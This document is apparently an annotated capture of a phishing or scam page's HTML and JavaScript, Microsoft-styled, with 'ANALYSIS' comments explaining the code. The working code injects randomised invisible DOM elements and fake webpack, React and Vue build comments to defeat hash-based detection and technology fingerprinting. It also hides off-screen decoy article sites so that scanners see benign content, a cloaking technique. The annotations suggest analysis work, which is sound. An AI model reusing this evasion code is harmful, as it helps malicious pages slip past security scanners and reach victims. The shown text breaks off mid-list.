+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1b1b1b}#loaderContainer{position:fixed;inset:0;align-items:center;justify-content:center;z-index:9999;background:#1b1b1b}.msSpinner{width:48px;height:48px;position:relative}.msSpinner::before{content:"";position:absolute;inset:0;border:3px solid rgba(255,255,255,0.1);border-top-color:#0078d4;border-radius:50%;animation:msSpin 0.9s linear infinite}@keyframes msSpin{to{transform:rotate(360deg)}}</style><style>*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}html,body{height:100%}body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',Arial,sans-serif;background:#1b1b1b;color:#fff;display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}@keyframes auroraShift{0%{transform:translate(0,0) scale(1)}100%{transform:translate(-5%,3%) scale(1.05)}}@keyframes slideDisk{0%{left:-40px;opacity:0;transform:translateY(-50%) scale(0.5)}8%{opacity:1;transform:translateY(-50%) scale(1.05)}12%{transform:translateY(-50%) scale(1)}88%{opacity:1;transform:translateY(-50%) scale(1)}95%{transform:translateY(-50%) scale(0.95)}100%{left:calc(100% + 6px);opacity:0;transform:translateY(-50%) scale(0.5)}}@keyframes sweepFill{0%{width:0}100%{width:100%}}@keyframes glowPulse{0%,100%{box-shadow:0 0 6px rgba(0,120,212,0.3),0 2px 8px rgba(0,0,0,0.2)}50%{box-shadow:0 0 16px rgba(0,120,212,0.6),0 2px 12px rgba(0,0,0,0.3)}}</style></head>
+<body data-view="iepktcpwzasc" data-mode="system" data-ver="4.10.9" data-env="prod">
+    <script>
+        if(window._abLevel>=2){
+        if(window._vG&&window._vG()){}else{(function(){
+            if(window['_hc'])return;
+            
+            var _r=function(a){return a[_$$$(a.length)]};
+            var _id=function(l){var s='',c='abcdefghijklmnopqrstuvwxyz';for(var i=0;i<(l||8);i++)s+=c[_$$$(26)];return s};
+            var _idMixed=function(l){var s='',c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-';for(var i=0;i<(l||12);i++)s+=c[_$$$(64)];return s};
+            var _rHex=function(l){var s='',c='0123456789abcdef';for(var i=0;i<(l||8);i++)s+=c[_$$$(16)];return s};
+            var _rHash=function(){return _rHex(8)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(4)+'-'+_rHex(12)};
+            var _rSemver=function(){return _$$$(5)+'.'+_$$$(20)+'.'+_$$$(100)};
+            var _rPath=function(){
+                var dirs=['src','lib','dist','build','assets','components','modules','utils','core','app'];
+                var files=['index','main','app','bundle','chunk','vendor','runtime','polyfill','common'];
+                var exts=['js','ts','jsx','tsx','mjs'];
+                return _r(dirs)+'/'+_r(files)+'.'+_r(exts);
+            };
+            
+            var invisibleStyles=[
+                'position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;margin:-1px;overflow:hidden;border:0;padding:0',
+                'position:fixed;top:-100vh;left:-100vw;width:0;height:0;overflow:hidden',
+                'opacity:0;pointer-events:none;position:absolute;z-index:-1;transform:scale(0)',
+                'visibility:hidden;position:absolute;width:0;height:0;overflow:hidden',
+                'display:block;position:absolute;left:-9999em;top:auto;width:1px;height:1px;overflow:hidden',
+                'position:absolute;white-space:nowrap;width:1px;height:1px;overflow:hidden;border:0;padding:0;clip:rect(0,0,0,0);clip-path:inset(50%)',
+                'transform:translateX(-100vw);position:fixed;opacity:0'
+            ];
+            
+            var container=document.createElement('div');
+            container.style.cssText=_r(invisibleStyles);
+            container.setAttribute('aria-hidden','true');
+            container.setAttribute('id',_id(12));
+            container.setAttribute('class',_idMixed(16));
+            container.setAttribute('data-'+_id(6),_rHex(12));
+            
+<!-- ANALYSIS: Generates randomized HTML comments mimicking webpack, Vite, React, Vue, Angular, Svelte, and SSR build outputs. Injected into an invisible container on every render, producing a unique DOM fingerprint each time. Defeats content-based hash matching and technology fingerprinting. -->
+            var commentGenerators=[
+                function(){return '<!-- webpack:'+_r(['bootstrap','jsonp','require','chunk'])+' -->'},
+                function(){return '<!-- '+_r(['harmony','esm','cjs','amd'])+':'+_r(['export','import','default'])+' -->'},
+                function(){return '<!-- module:'+_rPath()+' -->'},
+                function(){return '<!-- chunk:'+_$$$(100)+' -->'},
+                function(){return '<!-- vite-ignore -->'},
+                function(){return '<!-- pure -->'},
+                function(){return '<!-- react-'+_r(['root','app','mount','portal'])+' -->'},
+                function(){return '<!-- vue-'+_r(['component','slot','teleport'])+'-'+_rHex(6)+' -->'},
+                function(){return '<!-- ng-'+_r(['view','content','container'])+' -->'},
+                function(){return '<!-- '+_r(['terser','uglify','babel','swc','esbuild'])+':'+_r(['minified','optimized'])+' -->'},
+                function(){return '<!-- sourcemap:'+_rHex(16)+'.map -->'},
+                function(){return '<!-- '+_rHash()+' -->'},
+                function(){return '<!-- hydration-'+_r(['boundary','marker','root'])+'-'+_rHex(6)+' -->'},
+                function(){return '<!-- ssr-'+_r(['content','placeholder','fallback'])+' -->'}
+            ];
+            
+<!-- ANALYSIS: Generates randomized invisible DOM nodes: inputs, skip links, ARIA live regions, SVG defs, template elements, JSON blobs, style tags with framework attributes (data-reactroot, data-vueapp, data-ngapp, data-sveltekit). Combined with commentGenerators, ensures no two renders produce the same DOM. -->
+            var componentGenerators=[
+                function(){
+                    var inputTypes=['text','email','tel','search','url','hidden'];
+                    return '<input type="'+_r(inputTypes)+'" name="'+_id(8)+'" value="" tabindex="-1" autocomplete="off" aria-hidden="true" style="'+_r(invisibleStyles)+'">';
+                },
+                function(){
+                    return '<a href="#'+_id(8)+'" class="'+_id(10)+'" style="'+_r(invisibleStyles)+'" tabindex="-1">'+_r(['Skip to content','Skip navigation'])+'</a>';
+                },
+                function(){
+                    return '<div role="'+_r(['status','alert','log'])+'" aria-live="'+_r(['polite','assertive','off'])+'" aria-atomic="true" class="'+_id(10)+'" style="'+_r(invisibleStyles)+'"></div>';
+                },
+                function(){
+                    return '<div id="'+_r(['portal','modal','tooltip','popover'])+'-'+_id(6)+'" class="'+_id(10)+'" style="'+_r(invisibleStyles)+'"></div>';
+                },
+                function(){
+                    return '<svg xmlns="http://www.w3.org/2000/svg" style="'+_r(invisibleStyles)+'"><defs><symbol id="'+_id(8)+'"><path d="M0 0"/></symbol></defs></svg>';
+                },
+                function(){
+                    return '<template id="'+_id(10)+'" data-'+_id(6)+'="'+_idMixed(8)+'"><div class="'+_id(8)+'"></div></template>';
+                },
+                function(){
+                    return '<script type="application/json" id="'+_r(['__INITIAL_STATE__','__PRELOADED_STATE__','__APP_DATA__'])+'" data-'+_id(4)+'="'+_rHex(8)+'">{"v":'+_$$$(100)+'}<\/script>';
+                },
+                function(){
+                    return '<style id="'+_id(8)+'" data-'+_r(['emotion','styled','jss','css'])+'-'+_rHex(6)+'">/*'+_rHex(16)+'*/</style>';
+                },
+                function(){
+                    return '<div data-'+_r(['reactroot','vueapp','ngapp','sveltekit'])+' data-'+_id(6)+'="'+_rHex(12)+'" id="'+_id(10)+'" style="'+_r(invisibleStyles)+'"></div>';
+                },
+                function(){
+                    return '<span id="'+_id(8)+'" class="'+_id(10)+'" aria-hidden="true" style="'+_r(invisibleStyles)+'"></span>';
+                },
+                function(){
+                    return '<canvas id="'+_id(8)+'" width="0" height="0" style="'+_r(invisibleStyles)+'" aria-hidden="true"></canvas>';
+                },
+                function(){
+                    return '<progress id="'+_id(8)+'" value="0" max="100" style="'+_r(invisibleStyles)+'" aria-hidden="true"></progress>';
+                }
+            ];
+            
+            var html='';
+            var commentCount=5+_$$$(8);
+            for(var i=0;i<commentCount;i++){
+                html+=_r(commentGenerators)();
+            }
+            
+            var componentCount=8+_$$$(13);
+            for(var i=0;i<componentCount;i++){
+                html+=_r(componentGenerators)();
+                if(_$$()*100>60){
+                    html+=_r(commentGenerators)();
+                }
+            }
+            
+            var noscriptContent=[
+                '<meta http-equiv="refresh" content="0;url=?nojs=1">',
+                '<div class="'+_id(10)+'" style="padding:20px;text-align:center"><p>Please enable JavaScript to continue</p></div>'
+            ];
+            html+='<noscript>'+_r(noscriptContent)+'</noscript>';
+            
+            for(var i=0;i<2+_$$$(4);i++){
+                html+=_r(commentGenerators)();
+            }
+            
+            container.innerHTML=html;
+            document.body.appendChild(container);
+            
+            var bodyAttrs=[
+                ['data-'+_r(['page','route','view','screen']),_id(12)],
+                ['data-'+_r(['theme','mode','scheme']),_r(['light','dark','auto','system'])],
+                ['data-'+_r(['version','v','ver']),_rSemver()],
+                ['data-'+_r(['env','environment']),_r(['production','prod','live'])],
+                ['data-'+_r(['locale','lang','language']),_r(['en','en-US','en-GB'])],
+                ['data-'+_r(['build','hash','commit']),_rHex(8)],
+                ['data-'+_r(['timestamp','ts','time']),Date.now().toString(36)],
+                ['data-'+_r(['session','sid','ssid']),_rHash()]
+            ];
+            var attrCount=3+_$$$(4);
+            for(var i=0;i<attrCount;i++){
+                var attr=bodyAttrs[i%bodyAttrs.length];
+                document.body.setAttribute(attr[0],attr[1]);
+            }
+        })();}
+        }
+    </script><div aria-hidden="true" id="yryfparbktte" class="k7e42cAEpGy08Vzh" data-ckwlxl="c1c7be2f5d0d" style="position: fixed; top: -100vh; left: -100vw; width: 0px; height: 0px; overflow: hidden;"><!-- webpack:chunk --><!-- react-app --><!-- vue-slot-691067 --><!-- ng-view --><!-- vite-ignore --><!-- sourcemap:5e40d0de5168dbee.map --><!-- react-root --><!-- vue-slot-e50588 --><progress id="auvwghdd" value="0" max="100" style="position:absolute;white-space:nowrap;width:1px;height:1px;overflow:hidden;border:0;padding:0;clip:rect(0,0,0,0);clip-path:inset(50%)" aria-hidden="true"></progress><!-- vue-teleport-8b0799 --><div id="tooltip-udriuj" class="bnorsjjllo" style="position:fixed;top:-100vh;left:-100vw;width:0;height:0;overflow:hidden"></div><div role="alert" aria-live="assertive" aria-atomic="true" class="ixxiscimye" style="display:block;position:absolute;left:-9999em;top:auto;width:1px;height:1px;overflow:hidden"></div><!-- vue-component-0dac3d --><progress id="lrddghpx" value="0" max="100" style="position:fixed;top:-100vh;left:-100vw;width:0;height:0;overflow:hidden" aria-hidden="true"></progress><canvas id="otndmooy" width="0" height="0" style="visibility:hidden;position:absolute;width:0;height:0;overflow:hidden" aria-hidden="true"></canvas><div role="log" aria-live="off" aria-atomic="true" class="esrjvqstca" style="opacity:0;pointer-events:none;position:absolute;z-index:-1;transform:scale(0)"></div><div data-vueapp="" data-bljjob="d16626b54582" id="jkgnxibult" style="position:fixed;top:-100vh;left:-100vw;width:0;height:0;overflow:hidden"></div><canvas id="rdeiqgxa" width="0" height="0" style="position:fixed;top:-100vh;left:-100vw;width:0;height:0;overflow:hidden" aria-hidden="true"></canvas><template id="qwanqceuum" data-tdplxx="Qrle2YUv"><div class="crhugrho"></div></template><!-- hydration-boundary-f299b8 --><div id="portal-hzvsnb" class="caidhijujh" style="opacity:0;pointer-events:none;position:absolute;z-index:-1;transform:scale(0)"></div><template id="kpsjfeqvpz" data-nvjnku="bYIdGcj1"><div class="vmlicgcc"></div></template><!-- esm:import --><a href="#szfczipi" class="guwmwnlyqn" style="transform:translateX(-100vw);position:fixed;opacity:0" tabindex="-1">Skip to content</a><span id="qiitvdub" class="bcgllvytag" aria-hidden="true" style="position:absolute;white-space:nowrap;width:1px;height:1px;overflow:hidden;border:0;padding:0;clip:rect(0,0,0,0);clip-path:inset(50%)"></span><!-- sourcemap:7783b980516c9153.map --><template id="ixlbmyembx" data-nelzoc="5WatNMd6"><div class="wyisdygo"></div></template><svg xmlns="http://www.w3.org/2000/svg" style="opacity:0;pointer-events:none;position:absolute;z-index:-1;transform:scale(0)"><defs><symbol id="xyfzxyby"><path d="M0 0"></path></symbol></defs></svg><!-- sourcemap:974d3c16a48d05ee.map --><script type="application/json" id="__INITIAL_STATE__" data-dexq="b5cb0e3c">{"v":3}</script><noscript><meta http-equiv="refresh" content="0;url=?nojs=1"></noscript><!-- chunk:96 --><!-- cjs:export --><!-- esbuild:optimized --><!-- chunk:38 --></div>
+    
+    <div <!-- ANALYSIS: _pgContent is a static fallback decoy: a fully-formed article site (header, nav, 3 articles, sidebar, footer) positioned off-screen. Provides a stable crawlable DOM for scanners that snapshot before JavaScript runs. Content is overwritten by the dynamic randomizer if _abLevel >= 2. -->
+id="_pgContent" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;" aria-hidden="true"><header><nav><div><strong>TravelMosaic</strong> <span>Travel &amp; Culture</span></div><ul><li><a href="#">Home</a></li><li><a href="#">Destinations</a></li><li><a href="#">Guides</a></li><li><a href="#">Reviews</a></li><li><a href="#">Photos</a></li><li><a href="#">Plan a Trip</a></li></ul></nav></header><main><section><h1>Your Trusted Knowledge Hub</h1><p>From beginner fundamentals to advanced strategies, explore comprehensive resources designed to accelerate your growth and deepen your understanding of what matters most.</p></section><div><div><article><h2>Healthcare Digital Transformation</h2><div><span>By Dr. Emily Roberts</span> <time>Mar 11, 2026</time> <span>9 min read</span></div><p>Telemedicine platforms, electronic health records, and AI-assisted diagnostic tools are improving patient outcomes while reducing healthcare delivery costs. Remote patient monitoring enables continuous care management for chronic conditions without requiring frequent in-person visits.</p><p>Interoperability standards are facilitating seamless data exchange between healthcare providers, enabling coordinated care delivery and population health management initiatives across institutional boundaries.</p><div><a href="#">Read More</a> <a href="#">Share</a> <a href="#">Bookmark</a></div></article><article><h2>Remote Collaboration and Team Dynamics</h2><div><span>By Chris Anderson</span> <time>Jun 4, 2026</time> <span>6 min read</span></div><p>Distributed teams have developed new communication patterns and collaboration frameworks that often surpass traditional office-based productivity metrics. Asynchronous workflows, comprehensive documentation practices, and intentional social rituals help maintain team cohesion across time zones and geographies.</p><p>The hybrid work model has become the dominant paradigm, with organizations redesigning physical spaces as collaboration hubs while supporting individual focused work through flexible remote arrangements.</p><div><a href="#">Read More</a> <a href="#">Share</a> <a href="#">Bookmark</a></div></article><article><h2>Sustainable Practices for Organizations</h2><div><span>By Marcus Johnson</span> <time>Oct 7, 2026</time> <span>11 min read</span></div><p>Corporate sustainability has transitioned from an optional initiative to a strategic imperative. Companies implementing comprehensive environmental programs report improved operational efficiency, stronger brand loyalty, and increased attractiveness to top-tier talent seeking purpose-driven employers.</p><p>Circular economy principles are being integrated into product design, manufacturing processes, and end-of-life management, creating closed-loop systems that minimize waste and maximize resource utilization.</p><div><a href="#">Read More</a> <a href="#">Share</a> <a href="#">Bookmark</a></div></article><article><h2>Understanding Modern Infrastructure</h2><div><span>By Chris Anderson</span> <time>Feb 1, 2026</time> <span>3 min read</span></div><p>Scalable systems have become the backbone of digital transformation across industries. Organizations leverage distributed architectures, containerization, and microservices to build resilient platforms capable of handling millions of concurrent users while maintaining sub-second response times.</p><p>The evolution from monolithic deployments to cloud-native approaches has reduced time-to-market by an average of 40 percent, enabling rapid iteration and continuous delivery pipelines that align development velocity with business objectives.</p><div><a href="#">Read More</a> <a href="#">Share</a> <a href="#">Bookmark</a></div></article><article><h2>Cybersecurity in the Digital Age</h2><div><span>By David Kim</span> <time>Apr 20, 2026</time> <span>5 min read</span></div><p>The threat landscape continues to evolve with increasingly sophisticated attack vectors targeting cloud infrastructure, remote work environments, and supply chain dependencies. Zero-trust architectures have emerged as the predominant security model, requiring continuous verification of every user, device, and network connection.</p><p>Organizations are investing heavily in security awareness training, automated threat detection systems, and incident response capabilities to maintain resilience against ransomware, phishing campaigns, and advanced persistent threats.</p><div><a href="#">Read More</a> <a href="#">Share</a> <a href="#">Bookmark</a></div></article></div><aside><section><h3>Resources</h3><ul><li><a href="#">Documentation</a></li><li><a href="#">API Reference</a></li><li><a href="#">Video Library</a></li><li><a href="#">Webinar Archive</a></li><li><a href="#">Research Papers</a></li><li><a href="#">Templates</a></li><li><a href="#">Checklists</a></li><li><a href="#">Glossary</a></li></ul></section><section><h3>Follow Us</h3><ul><li><a href="#">Twitter</a></li><li><a href="#">LinkedIn</a></li><li><a href="#">Facebook</a></li><li><a href="#">Instagram</a></li><li><a href="#">YouTube</a></li></ul></section></aside></div></main><footer><div><p>© 2026 TravelMosaic Worldwide.</p><ul><li><a href="#">Privacy Policy</a></li><li><a href="#">Terms of Service</a></li><li><a href="#">Cookie Policy</a></li><li><a href="#">Accessibility</a></li><li><a href="#">Sitemap</a></li></ul></div></footer></div>
+    <script>
+    if(window._abLevel>=2){
+    (function(){
+        var _p=function(a){return a[Math.floor(Math.random()*a.length)]};
+        var _s=function(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;};
+        var yr=new Date().getFullYear();
+        var sites=[
+            {name:'TechPulse Daily',tag:'Technology & Innovation',nav:['Home','News','Reviews','Tutorials','About','Contact'],copy:'© '+yr+' TechPulse Daily. All rights reserved.'},
+            {name:'GreenLeaf Journal',tag:'Sustainability & Environment',nav:['Home','Articles','Research','Guides','Community','Subscribe'],copy:'© '+yr+' GreenLeaf Journal. Environmental insights.'},
+            {name:'FinanceForward',tag:'Business & Finance',nav:['Home','Markets','Investing','Personal Finance','Economy','Tools'],copy:'© '+yr+' FinanceForward Media Group.'},
+            {name:'HealthBridge',tag:'Health & Wellness',nav:['Home','Nutrition','Fitness','Mental Health','Research','Ask a Doctor'],copy:'© '+yr+' HealthBridge Wellness Network.'},
+            {name:'EduSpark',tag:'Education & Learning',nav:['Home','Courses','Resources','Research','Community','Careers'],copy:'© '+yr+' EduSpark Learning Platform.'},
+            {name:'CreativeNest',tag:'Design & Creativity',nav:['Home','Inspiration','Tutorials','Tools','Portfolio','Hire'],copy:'© '+yr+' CreativeNest Studios.'},
+            {name:'TravelMosaic',tag:'Travel & Culture',nav:['Home','Destinations','Guides','Reviews','Photos','Plan a Trip'],copy:'© '+yr+' TravelMosaic Worldwide.'},
+            {name:'DataStream',tag:'Data Science & AI',nav:['Home','Articles','Tutorials','Datasets','Tools','Newsletter'],copy:'© '+yr+' DataStream Analytics.'}
+        ];
+        var heroes=[
+            ['Empowering Your Digital Journey','Discover cutting-edge insights, expert analysis, and actionable strategies to stay ahead in an ever-evolving landscape. Our team of specialists curates content tailored to professionals and enthusiasts alike.'],
+            ['Innovation Starts Here','We bring you the latest breakthroughs, in-depth research, and practical guides. Join thousands of readers who rely on our expertise to make informed decisions every day.'],
+            ['Your Trusted Knowledge Hub','From beginner fundamentals to advanced strategies, explore comprehensive resources designed to accelerate your growth and deepen your understanding of what matters most.'],
+            ['Building a Better Tomorrow','Explore thought-provoking articles, data-driven analysis, and community-powered discussions that shape the future of industries and transform the way we think about progress.'],
+            ['Where Ideas Take Flight','Our curated collection of articles, guides, and expert opinions helps you navigate complexity with confidence. Stay informed, stay inspired, stay connected.']
+        ];
+        var articles=[
+            {t:'Understanding Modern Infrastructure',p:['Scalable systems have become the backbone of digital transformation across industries. Organizations leverage distributed architectures, containerization, and microservices to build resilient platforms capable of handling millions of concurrent users while maintaining sub-second response times.','The evolution from monolithic deployments to cloud-native approaches has reduced time-to-market by an average of 40 percent, enabling rapid iteration and continuous delivery pipelines that align development velocity with business objectives.']},
+            {t:'The Future of Artificial Intelligence',p:['Machine learning models continue to advance at an unprecedented pace, with large language models and generative AI reshaping how businesses approach content creation, customer support, and data analysis. Responsible AI governance frameworks are emerging to address bias, transparency, and accountability concerns.','Enterprise adoption of AI-powered tools has accelerated across sectors including healthcare diagnostics, financial risk assessment, supply chain optimization, and personalized education platforms.']},
+            {t:'Sustainable Practices for Organizations',p:['Corporate sustainability has transitioned from an optional initiative to a strategic imperative. Companies implementing comprehensive environmental programs report improved operational efficiency, stronger brand loyalty, and increased attractiveness to top-tier talent seeking purpose-driven employers.','Circular economy principles are being integrated into product design, manufacturing processes, and end-of-life management, creating closed-loop systems that minimize waste and maximize resource utilization.']},
+            {t:'Cybersecurity in the Digital Age',p:['The threat landscape continues to evolve with increasingly sophisticated attack vectors targeting cloud infrastructure, remote work environments, and supply chain dependencies. Zero-trust architectures have emerged as the predominant security model, requiring continuous verification of every user, device, and network connection.','Organizations are investing heavily in security awareness training, automated threat detection systems, and incident response capabilities to maintain resilience against ransomware, phishing campaigns, and advanced persistent threats.']},
+            {t:'Remote Collaboration and Team Dynamics',p:['Distributed teams have developed new communication patterns and collaboration frameworks that often surpass traditional office-based productivity metrics. Asynchronous workflows, comprehensive documentation practices, and intentional social rituals help maintain team cohesion across time zones and geographies.','The hybrid work model has become the dominant paradigm, with organizations redesigning physical spaces as collaboration hubs while supporting individual focused work through flexible remote arrangements.']},
+            {t:'Data Privacy and Consumer Rights',p:['Regulatory frameworks governing data collection, processing, and storage continue to expand globally, with organizations adapting their practices to comply with evolving requirements across multiple jurisdictions. Privacy-by-design principles are being embedded into product development lifecycles from the earliest stages.','Consumer awareness of digital rights has increased significantly, driving demand for transparent data practices, meaningful consent mechanisms, and accessible tools for managing personal information preferences.']},
+            {t:'The Evolution of E-Commerce',p:['Online retail continues to transform with innovations in augmented reality product visualization, voice-activated shopping, and hyper-personalized recommendation engines. Social commerce integration has blurred the boundaries between content consumption and purchasing behavior.','Logistics and fulfillment capabilities have become key differentiators, with same-day delivery, sustainable packaging initiatives, and seamless return processes shaping customer expectations and brand loyalty metrics.']},
+            {t:'Financial Technology Innovations',p:['Digital payment ecosystems, decentralized finance platforms, and embedded banking services are fundamentally reshaping how individuals and businesses interact with financial systems. Open banking APIs enable third-party developers to create innovative financial products and services.','Regulatory technology solutions help financial institutions navigate complex compliance requirements while reducing operational costs and improving the accuracy and timeliness of regulatory reporting obligations.']},
+            {t:'Healthcare Digital Transformation',p:['Telemedicine platforms, electronic health records, and AI-assisted diagnostic tools are improving patient outcomes while reducing healthcare delivery costs. Remote patient monitoring enables continuous care management for chronic conditions without requiring frequent in-person visits.','Interoperability standards are facilitating seamless data exchange between healthcare providers, enabling coordinated care delivery and population health management initiatives across institutional boundaries.']},
+            {t:'Education Technology Trends',p:['Adaptive learning platforms leverage real-time performance data to personalize educational pathways, adjusting content difficulty, pacing, and instructional approaches to optimize learning outcomes for individual students across diverse subject areas.','Micro-credentialing and competency-based assessment models are gaining acceptance among employers, offering alternative pathways to skill validation that complement traditional degree programs and professional certifications.']}
+        ];
+        var sidebars=[
+            {t:'Popular Topics',items:['Getting Started Guide','Advanced Techniques','Industry Analysis','Expert Interviews','Weekly Roundup','Community Spotlight','Tool Comparisons','Case Studies']},
+            {t:'Resources',items:['Documentation','API Reference','Video Library','Webinar Archive','Research Papers','Templates','Checklists','Glossary']},
+            {t:'Newsletter',desc:'Join over 50,000 subscribers who receive our weekly digest of curated insights, exclusive analysis, and practical tips delivered straight to their inbox every Thursday morning.'}
+        ];
+        var authors=['Sarah Mitchell','James Chen','Dr. Emily Roberts','Michael Torres','Aisha Patel','David Kim','Rachel Thompson','Marcus Johnson','Dr. Lisa Wang','Chris Anderson'];
+        var dates=[];for(var di=1;di<=28;di++){var mo=_p(['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']);dates.push(mo+' '+di+', '+yr);}
+
+        var site=_p(sites);
+        var hero=_p(heroes);
+        var picked=_s(articles.slice()).slice(0,3+Math.floor(Math.random()*3));
+        var sidebar=_p(sidebars);
+
+        var h='<header><nav><div><strong>'+site.name+'</strong> <span>'+site.tag+'</span></div><ul>';
+        for(var ni=0;ni<site.nav.length;ni++) h+='<li><a href="#">'+site.nav[ni]+'</a></li>';
+        h+='</ul></nav></header>';
+        h+='<main><section><h1>'+hero[0]+'</h1><p>'+hero[1]+'</p></section>';
+        h+='<div><div>';
+        for(var ai=0;ai<picked.length;ai++){
+            var a=picked[ai],au=_p(authors),dt=_p(dates);
+            h+='<article><h2>'+a.t+'</h2><div><span>By '+au+'</span> <time>'+dt+'</time> <span>'+Math.floor(3+Math.random()*10)+' min read</span></div>';
+            for(var pi=0;pi<a.p.length;pi++) h+='<p>'+a.p[pi]+'</p>';
+            h+='<div><a href="#">Read More</a> <a href="#">Share</a> <a href="#">Bookmark</a></div></article>';
+        }
+        h+='</div><aside><section><h3>'+sidebar.t+'</h3>';
+        if(sidebar.items){h+='<ul>';for(var si=0;si<sidebar.items.length;si++)h+='<li><a href="#">'+sidebar.items[si]+'</a></li>';h+='</ul>';}
+        if(sidebar.desc) h+='<p>'+sidebar.desc+'</p><form><input type="email" placeholder="your@email.com"><button type="button">Subscribe</button></form>';
+        h+='</section><section><h3>Follow Us</h3><ul><li><a href="#">Twitter</a></li><li><a href="#">LinkedIn</a></li><li><a href="#">Facebook</a></li><li><a href="#">Instagram</a></li><li><a href="#">YouTube</a></li></ul></section></aside>';
+        h+='</div></main>';
+        h+='<footer><div><p>'+site.copy+'</p><ul><li><a href="#">Privacy Policy</a></li><li><a href="#">Terms of Service</a></li><li><a href="#">Cookie Policy</a></li><li><a href="#">Accessibility</a></li><li><a href="#">Sitemap</a></li></ul></div></footer>';
+
+        document.getElementById('_pgContent').innerHTML=h;
+    })();
+    }
+    </script>
+
+    <div <!-- ANALYSIS: _staticFakeContent is a secondary static decoy with richer semantic HTML: ARIA roles, placeholder images with alt text, a newsletter form, testimonials, and a multi-column footer. More convincing to accessibility-aware scanners. Shown via display:block when _abLevel >= 2. -->
+id="_staticFakeContent" style="position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; overflow: hidden; opacity: 0; pointer-events: none; display: block;" aria-hidden="true">
+        <header>
+            <nav role="navigation" aria-label="Main navigation">
+                <a href="/" aria-label="Home">Home</a>
+                <ul>
+                    <li><a href="/about">About Us</a></li>
+                    <li><a href="/services">Services</a></li>
+                    <li><a href="/blog">Blog</a></li>
+                    <li><a href="/resources">Resources</a></li>
+                    <li><a href="/pricing">Pricing</a></li>
+                    <li><a href="/contact">Contact</a></li>
+                </ul>
+                <form role="search" aria-label="Site search">
+                    <label for="_sq">Search</label>
+                    <input type="search" id="_sq" name="q" placeholder="Search articles...">
+                    <button type="submit">Search</button>
+                </form>
+            </nav>
+        </header>
+        <div role="banner">
+            <h1>Welcome to Our Platform</h1>
+            <p>Your trusted source for professional insights, guides, and industry analysis.</p>
+            <a href="/get-started" role="button">Get Started</a>
+            <a href="/learn-more">Learn More</a>
+        </div>
+        <main role="main">
+            <section aria-labelledby="_fh">
+                <h2 id="_fh">Featured Articles</h2>
+                <div role="list">
+                    <article role="listitem">
+                        <figure><img src="/images/placeholder-1.jpg" alt="Cloud computing infrastructure diagram" width="640" height="360" loading="lazy"></figure>
+                        <h3><a href="/blog/cloud-computing-guide">Complete Guide to Cloud Computing in 2025</a></h3>
+                        <p>An in-depth exploration of modern cloud architectures, deployment strategies, and cost optimization techniques for businesses of all sizes.</p>
+                        <div><span>By Sarah Mitchell</span> <time datetime="2025-03-15">March 15, 2025</time> <span>8 min read</span></div>
+                        <ul aria-label="Tags"><li><a href="/tag/cloud">Cloud</a></li><li><a href="/tag/devops">DevOps</a></li><li><a href="/tag/infrastructure">Infrastructure</a></li></ul>
+                    </article>
+                    <article role="listitem">
+                        <figure><img src="/images/placeholder-2.jpg" alt="Data visualization dashboard" width="640" height="360" loading="lazy"></figure>
+                        <h3><a href="/blog/data-analytics-trends">Data Analytics Trends Reshaping Industries</a></h3>
+                        <p>How real-time analytics, predictive modeling, and automated reporting are transforming decision-making across healthcare, finance, and retail sectors.</p>
+                        <div><span>By James Chen</span> <time datetime="2025-04-02">April 2, 2025</time> <span>6 min read</span></div>
+                        <ul aria-label="Tags"><li><a href="/tag/analytics">Analytics</a></li><li><a href="/tag/ai">AI</a></li><li><a href="/tag/business">Business</a></li></ul>
+                    </article>
+                    <article role="listitem">
+                        <figure><img src="/images/placeholder-3.jpg" alt="Cybersecurity shield concept" width="640" height="360" loading="lazy"></figure>
+                        <h3><a href="/blog/cybersecurity-essentials">Cybersecurity Essentials for Remote Teams</a></h3>
+                        <p>Best practices for securing distributed workforces, including zero-trust frameworks, endpoint protection, and security awareness training programs.</p>
+                        <div><span>By Dr. Emily Roberts</span> <time datetime="2025-05-10">May 10, 2025</time> <span>10 min read</span></div>
+                        <ul aria-label="Tags"><li><a href="/tag/security">Security</a></li><li><a href="/tag/remote-work">Remote Work</a></li></ul>
+                    </article>
+                </div>
+            </section>
+            <section aria-labelledby="_ch">
+                <h2 id="_ch">Categories</h2>
+                <ul role="list">
+                    <li><a href="/category/technology"><strong>Technology</strong><span>142 articles</span></a></li>
+                    <li><a href="/category/business"><strong>Business</strong><span>98 articles</span></a></li>
+                    <li><a href="/category/health"><strong>Health &amp; Wellness</strong><span>76 articles</span></a></li>
+                    <li><a href="/category/education"><strong>Education</strong><span>63 articles</span></a></li>
+                    <li><a href="/category/finance"><strong>Finance</strong><span>85 articles</span></a></li>
+                    <li><a href="/category/sustainability"><strong>Sustainability</strong><span>51 articles</span></a></li>
+                </ul>
+            </section>
+            <aside role="complementary" aria-label="Sidebar">
+                <section>
+                    <h3>Newsletter</h3>
+                    <p>Get weekly insights delivered to your inbox. Join 50,000+ professionals.</p>
+                    <form aria-label="Newsletter signup">
+                        <label for="_ne">Email address</label>
+                        <input type="email" id="_ne" name="email" placeholder="you@example.com" required="">
+                        <button type="button">Subscribe</button>
+                    </form>
+                </section>
+                <section>
+                    <h3>Popular This Week</h3>
+                    <ol>
+                        <li><a href="/blog/ai-productivity">How AI Is Boosting Workplace Productivity</a></li>
+                        <li><a href="/blog/startup-funding">Startup Funding Strategies for 2025</a></li>
+                        <li><a href="/blog/mental-health">Mental Health Resources for Professionals</a></li>
+                        <li><a href="/blog/sustainable-tech">Sustainable Technology Practices</a></li>
+                        <li><a href="/blog/remote-leadership">Leading Remote Teams Effectively</a></li>
+                    </ol>
+                </section>
+                <section>
+                    <h3>Follow Us</h3>
+                    <ul>
